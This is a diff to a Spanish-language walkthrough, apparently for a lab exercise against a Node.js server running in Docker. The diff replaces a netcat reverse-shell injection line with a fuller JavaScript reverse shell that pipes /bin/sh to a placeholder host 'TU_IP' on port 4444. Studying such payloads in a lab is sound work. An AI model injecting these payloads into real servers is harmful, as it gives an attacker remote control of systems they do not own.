@@ -120,9 +120,17 @@ nc -lvnp 4444
 Necesitamos decirle al servidor que se conecte de vuelta a tu ordenador.
 **Importante**: Necesitas la IP de tu ordenador que sea accesible desde Docker (prueba `hostname -I` o mira tu configuración de red). Digamos que es `TU_IP`.
 
-El código Javascript a inyectar es:
+El código Javascript a inyectar es un poco más complejo porque no podemos confiar en `netcat`:
 ```javascript
-require('child_process').exec('nc TU_IP 4444 -e /bin/sh');
+var net = process.mainModule.require('net');
+var cp = process.mainModule.require('child_process');
+var sh = cp.spawn('/bin/sh', []);
+var client = new net.Socket();
+client.connect(4444, 'TU_IP', function() {
+    client.pipe(sh.stdin);
+    sh.stdout.pipe(client);
+    sh.stderr.pipe(client);
+});
 ```
 
 ### 3. Envía el Exploit
